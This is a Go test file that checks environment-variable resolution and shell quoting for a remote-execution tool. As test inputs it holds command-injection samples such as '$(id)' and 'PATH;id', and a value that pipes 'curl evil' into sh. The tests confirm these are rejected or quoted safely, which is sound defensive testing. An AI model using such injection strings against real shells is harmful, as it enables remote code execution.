package rde

import (
	"strings"
	"testing"
)

func TestResolveExecEnv(t *testing.T) {
	local := map[string]string{
		"SET_VAR":   "local-value",
		"EMPTY_VAR": "",
		"OTHER":     "other-value",
	}

	tests := []struct {
		name        string
		fileEntries []string
		flagEntries []string
		wantVars    []EnvVar
		wantSkipped []string
		wantErr     string // substring; "" means no error
	}{
		{
			name:        "flag literal",
			flagEntries: []string{"FOO=bar"},
			wantVars:    []EnvVar{{"FOO", "bar"}},
		},
		{
			name:        "flag forwards local value",
			flagEntries: []string{"SET_VAR"},
			wantVars:    []EnvVar{{"SET_VAR", "local-value"}},
		},
		{
			name:        "flag unset local var is a hard error",
			flagEntries: []string{"MISSING_VAR"},
			wantErr:     "--env MISSING_VAR: not set in the local environment",
		},
		{
			name:        "file unset local var is skipped, not an error",
			fileEntries: []string{"MISSING_VAR", "SET_VAR"},
			wantVars:    []EnvVar{{"SET_VAR", "local-value"}},
			wantSkipped: []string{"MISSING_VAR"},
		},
		{
			name:        "file literal",
			fileEntries: []string{"FOO=from-file"},
			wantVars:    []EnvVar{{"FOO", "from-file"}},
		},
		{
			name:        "flag overrides file value but keeps file position",
			fileEntries: []string{"A=file-a", "B=file-b"},
			flagEntries: []string{"A=flag-a", "C=flag-c"},
			wantVars:    []EnvVar{{"A", "flag-a"}, {"B", "file-b"}, {"C", "flag-c"}},
		},
		{
			name:        "duplicate flag names: last value wins, one entry",
			flagEntries: []string{"A=first", "A=second"},
			wantVars:    []EnvVar{{"A", "second"}},
		},
		{
			name:        "file-skipped name supplied by flag is forwarded and not warned",
			fileEntries: []string{"MISSING_VAR"},
			flagEntries: []string{"MISSING_VAR=explicit"},
			wantVars:    []EnvVar{{"MISSING_VAR", "explicit"}},
			wantSkipped: nil,
		},
		{
			name:        "set-but-empty local var forwards empty, not skipped",
			fileEntries: []string{"EMPTY_VAR"},
			flagEntries: []string{"EMPTY_VAR"},
			wantVars:    []EnvVar{{"EMPTY_VAR", ""}},
		},
		{
			name:        "NAME= is an explicit empty literal even when unset locally",
			flagEntries: []string{"MISSING_VAR="},
			wantVars:    []EnvVar{{"MISSING_VAR", ""}},
		},
		{
			name:        "value keeps everything after the first =",
			flagEntries: []string{"A=b=c"},
			wantVars:    []EnvVar{{"A", "b=c"}},
		},
		{
			name:        "invalid name in flag",
			flagEntries: []string{"BAD-NAME=v"},
			wantErr:     `invalid environment variable name "BAD-NAME" in --env flag`,
		},
		{
			name:        "invalid name in file names the file",
			fileEntries: []string{"PATH;id"},
			wantErr:     `invalid environment variable name "PATH;id" in /repo/.bitrise/rde.yml`,
		},
		{
			name:        "name starting with a digit",
			flagEntries: []string{"1ABC=v"},
			wantErr:     `invalid environment variable name "1ABC"`,
		},
		{
			name:        "name with a space",
			flagEntries: []string{"A B=v"},
			wantErr:     `invalid environment variable name "A B"`,
		},
		{
			name:        "command substitution in a name",
			fileEntries: []string{"$(id)"},
			wantErr:     `invalid environment variable name "$(id)"`,
		},
		{
			name:        "empty name from a bare =value entry",
			flagEntries: []string{"=v"},
			wantErr:     `invalid environment variable name ""`,
		},
	}

	for _, tc := range tests {
		t.Run(tc.name, func(t *testing.T) {
			vars, skipped, err := ResolveExecEnv(tc.fileEntries, "/repo/.bitrise/rde.yml", tc.flagEntries, stubLookup(local))
			if tc.wantErr != "" {
				if err == nil || !strings.Contains(err.Error(), tc.wantErr) {
					t.Fatalf("err = %v, want substring %q", err, tc.wantErr)
				}
				// Errors must never leak a value.
				for _, leak := range []string{"=v", "local-value"} {
					if strings.Contains(err.Error(), leak) && !strings.Contains(tc.wantErr, leak) {
						t.Errorf("error %q leaks a value", err)
					}
				}
				return
			}
			if err != nil {
				t.Fatalf("ResolveExecEnv: %v", err)
			}
			if len(vars) != len(tc.wantVars) {
				t.Fatalf("vars = %+v, want %+v", vars, tc.wantVars)
			}
			for i := range vars {
				if vars[i] != tc.wantVars[i] {
					t.Errorf("vars[%d] = %+v, want %+v", i, vars[i], tc.wantVars[i])
				}
			}
			if len(skipped) != len(tc.wantSkipped) {
				t.Fatalf("skipped = %v, want %v", skipped, tc.wantSkipped)
			}
			for i := range skipped {
				if skipped[i] != tc.wantSkipped[i] {
					t.Errorf("skipped[%d] = %q, want %q", i, skipped[i], tc.wantSkipped[i])
				}
			}
		})
	}
}

func TestBuildEnvExportPrefix(t *testing.T) {
	tests := []struct {
		name    string
		env     []EnvVar
		want    string
		wantErr bool
	}{
		{
			name: "empty list yields no prefix",
			env:  nil,
			want: "",
		},
		{
			name: "single var",
			env:  []EnvVar{{"A", "1"}},
			want: `export A='1'; `,
		},
		{
			name: "multiple vars preserve order",
			env:  []EnvVar{{"B", "2"}, {"A", "1"}},
			want: `export B='2'; export A='1'; `,
		},
		{
			// A value carrying a single quote must not be able to close the
			// quoting and smuggle shell syntax into the remote command.
			name: "single quote in value is escaped",
			env:  []EnvVar{{"A", "it's"}},
			want: `export A='it'\''s'; `,
		},
		{
			name: "adversarial value stays inert inside quotes",
			env:  []EnvVar{{"A", `'; curl evil | sh; '`}},
			want: `export A=''\''; curl evil | sh; '\'''; `,
		},
		{
			// The remote shell is bash -i (interactive), where history
			// expansion is live; single quotes are the only quoting that
			// keeps a '!' inert, so the always-quote behavior is load-bearing.
			name: "history expansion characters stay quoted",
			env:  []EnvVar{{"A", "hello!world"}},
			want: `export A='hello!world'; `,
		},
		{
			name: "newline in value survives",
			env:  []EnvVar{{"A", "line1\nline2"}},
			want: "export A='line1\nline2'; ",
		},
		{
			name: "empty value",
			env:  []EnvVar{{"A", ""}},
			want: `export A=''; `,
		},
		{
			// Execute is a public entry point; a caller constructing EnvVar
			// directly must not bypass name validation.
			name:    "invalid name is rejected",
			env:     []EnvVar{{"A;id", "v"}},
			wantErr: true,
		},
	}

	for _, tc := range tests {
		t.Run(tc.name, func(t *testing.T) {
			got, err := buildEnvExportPrefix(tc.env)
			if tc.wantErr {
				if err == nil {
					t.Fatalf("buildEnvExportPrefix(%+v) = %q, want error", tc.env, got)
				}
				return
			}
			if err != nil {
				t.Fatalf("buildEnvExportPrefix: %v", err)
			}
			if got != tc.want {
				t.Errorf("buildEnvExportPrefix(%+v) = %q, want %q", tc.env, got, tc.want)
			}
		})
	}
}

// TestEnvPrefixThroughLoginShell pins the composition with the transport
// wrapper: buildLoginShellCmd re-escapes the prefix's single quotes (the
// same already-tested path that quoted user commands take), so any future
// "optimization" that skips quoting in the prefix breaks this test.
func TestEnvPrefixThroughLoginShell(t *testing.T) {
	prefix, err := buildEnvExportPrefix([]EnvVar{{"FOO", "it's"}})
	if err != nil {
		t.Fatalf("buildEnvExportPrefix: %v", err)
	}
	got := buildLoginShellCmd(prefix + "echo hi")
	want := `bash -i -l -c 'export FOO='\''it'\''\'\'''\''s'\''; echo hi'`
	if got != want {
		t.Errorf("composed command = %q, want %q", got, want)
	}
}

// stubLookup returns a lookupEnv func backed by a plain map; a key must be
// present to count as set (an empty value is set-but-empty).
func stubLookup(env map[string]string) func(string) (string, bool) {
	return func(name string) (string, bool) {
		v, ok := env[name]
		return v, ok
	}
}
